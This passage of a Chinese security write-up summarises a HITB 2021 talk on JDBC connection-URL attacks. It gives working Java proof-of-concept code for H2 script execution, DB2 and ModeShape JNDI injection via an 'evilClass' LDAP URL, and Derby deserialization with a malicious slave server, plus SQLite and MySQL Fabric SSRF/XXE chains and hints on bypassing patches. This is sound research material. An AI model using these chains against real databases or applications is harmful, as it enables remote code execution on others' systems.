@@ -1,0 +1,100 @@
+    }
+然而 Groovy 依赖并不容易遇到，因此 Litch1 又给出了使用 JavaScript 和 `CREATE TRIGGER`
+的利用链，这条链不仅仅编译源代码，还调用了 eval 执行。
+POC 如下:
+    public static void main (String[] args) throws ClassNotFoundException, SQLException {
+        String javascript = "//javascript\njava.lang.Runtime.getRuntime().exec(\"open -a Calculator.app\")";
+        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER hhhh BEFORE SELECT ON INFORMATION_SCHEMA.CATALOGS AS '"+ javascript +"'";
+        Connection conn = DriverManager.getConnection(url);
+        conn.close();
+    }
+## IBM DB2
+MySQL 中发现的漏洞是由于其可配置属性的特性造成的。那么，如果可控，是否还有其他可配置属性会导致漏洞？
+在 DB2 中，Litch1 找到了 `clientRerouteServerListJNDINameIdentifies`。这个属性的作用是什么呢？如下：
+It's a JNDI reference to a DB2ClientRerouteServerList instance in a JNDI
+repository of reroute server `information.clientRerouteServerListJNDIName`
+applies only to IBM Data Server Driver for JDBC and SQLJ type 4 connectivity,
+and to connections that are established through the DataSource interface.
+翻译成人话，就是这个 JDBC URL 配置可以导致 JNDI 注入。
+POC 如下:
+    public static void main(String[] args) throws Exception {
+        Class.forName("com.ibm.db2.jcc.DB2Driver");
+        DriverManager.getConnection("jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=ldap://127.0.0.1:1389/evilClass;");
+    }
+## ModeShape
+[ModeShape](https://modeshape.jboss.org/) 是一个 JCR(Java Content Repository)
+的实现，使用 JCR API 来从其他系统中获取数据，例如文件系统、 JDBC 元数据等。
+Repository 源可以配置成 `jdbc:jcr:jndi:jcr:?repositoryName=repository`.
+很明显又是一个 JNDI 注入，如下:
+    public static void main(String[] args) throws Exception {
+        Class.forName("org.modeshape.jdbc.LocalJcrDriver");
+        // A JNDI URL that points the hierarchical database to an evil LDAP service 
+        DriverManager.getConnection("jdbc:jcr:jndi:ldap://127.0.0.1:1389/evilClass");
+    }
+## Apache Derby
+Apache Derby 像 h2 一样，有时会被内嵌在一些系统中。在 derby 驱动源代码中 Litch1 在
+`org.apache.derby.impl.store.replication.net.SocketConnection`
+类中找到了一个可疑的反序列化调用。
+然后他发现了一个内部类 `ReplicationMessageTransmit$MasterReceiverThread` 调用了这个方法。
+`ReplicationMessageTransmit` 类是在配置了 `startMaster=true` 和 `slaveHost=127.0.0.2`
+之后用来在主从服务器之间拷贝数据的。
+如果我们将 slaveHost 字段配置成为了恶意的服务器，derby 会建立 JDBC 连接并读取恶意数据，`MasterReceiverThread`
+调用 `readMessage` 方法，恶意服务器将返回恶意代码并触发反序列化利用。
+POC 如下:
+    public static void main(String[] args) throws Exception{
+        Class.forName("org.apache.derby.jdbc.EmbeddedDriver");
+        DriverManager.getConnection("jdbc:derby:webdb;startMaster=true;slaveHost=evil_server_ip");
+    }
+恶意的 SLAVE 服务器如下:
+    public class EvilSlaveServer {
+        public static void main(String[] args) throws Exception {
+            int port = 4851;
+            ServerSocket server = new ServerSocket(port);
+            Socket socket = server.accept();
+            socket.getOutputStream().write(Serializer.serialize(new CommonsBeanutils1().getObject("open -a Calculator")));
+            socket.getOutputStream().flush();
+            Thread.sleep(TimeUnit.SECONDS.toMillis(5));
+            socket.close();
+            server.close();
+        }
+    }
+## SQLite
+在使用 SQLite 时， `org.sqlite.core.CoreConnection#open` 方法会在与服务器建立连接时被调用。
+这个方法提供了一个特性: 如果 connection URL 以 `:resource:` 开头，将会调用 `extractResource` 方法从
+URL 连接获取数据库内容。
+`extractResource()`方法代码如下:
+从这个方法我们可以看出，当我们的连接 URL 如下
+`jdbc:sqlite::resource:http://127.0.0.1:8888/poc.db`，SQLite 会尝试请求地址并从中读取内容。
+这首先无疑是个 SSRF，但是 SSRF 是不够的。
+那么当我们能控制 JDBC URL 和数据库文件内容时，该如何执行攻击呢？
+根据 "[SELECT code_execution FROM * USING
+SQLite;](https://research.checkpoint.com/2019/select-code_execution-from-using-sqlite/)"，我们可以使用 ”CREATE VIEW“ 不可控的 SELECT 语句转换为可控的 SELECT 语句。
+如果我们可以控制 SELECT 语句，我们可以使用 `SELECT load_extension('/tmp/test.so')` 来加载 dll/so
+并执行恶意代码，但是在实际环境中，并不是经常能遇见服务器上文件可控的情况，而且 load_extension 默认是不开启的。
+除了常见的漏洞之外，我们还可以使用 SQLite 中的内存损坏例如 “Magellan” 来导致JVM崩溃。（超出知识范围）
+# 如何防御
+以上就是 Litch1 研究和总结的全部攻击 JDBC Connection URL 的相关内容。
+这一部分讨论一下开源软件都是怎么抵御 JDBC 攻击的。
+**Apache Druid CVE-2021-26919 补丁**
+**Apache DolphinScheduler CVE-2020-11974 补丁**
+我们可以利用属性过滤器解析器和 JDBC 驱动程序解析器之间的差异，并使用它绕过安全补丁。
+# Java Service Provider Interface
+SPI 技术用于加载 JDBC 连接器的驱动程序。
+5.1.48 版本的 mysql connector，注册了两个 JDBC 驱动器。除了常规的
+`com.mysql.cj.jdbc.Driver`，还有一个`com.mysql.fabric.jdbc.FabricMySQLDriver`。
+MySQL Fabric 是一个用于管理 MySQL 服务器群的系统。MySQL Fabric 提供了一个广泛且易于使用的系统，用于管理 MySQL
+部署以实现共享和高可用性。
+Litch1 研究了 FabricMySQLDriver 的源码，发现如果 connection url 以 `jdbc:mysql:fabric://`
+开头，程序将会进入 Fabric 的处理逻辑。
+并将向主机发送一个 XMLRPC 请求。
+关键的代码点都在上面两张 PPT 中，在使用 Fabric 驱动时，在建立 JDBC 连接后，会自动触发一个 XMLRPC 请求，这显然是一个 SSRF。
+但某位大牛曾经说过，SSRF 是 RCE 的起手式。Litch1 继续深挖，发现了在处理相应数据时产生的 XXE 漏洞。
+所以漏洞触发过程很简单，建立连接，解析 XML，PPT 中给出了恶意服务端的 python 源代码。
+# 总结
+全部的测试环境和代码已经公开在了 Github 项目中，请移步查看：
+# 彩蛋
+在群聊赛博回忆录中，有师傅提到，PostgreSQL Connection URL 有几个参数可以导致问题，研究了一下之后发现可以
+getshell，目前没有更新在项目中，这里作为彩蛋提一下，有兴趣的师傅自行研究吧~
+# 引用
+[https://conference.hitb.org/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&%20Chen%20Hongkun.pdf](https://conference.hitb.org/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&%20Chen%20Hongkun.pdf)
+* * *
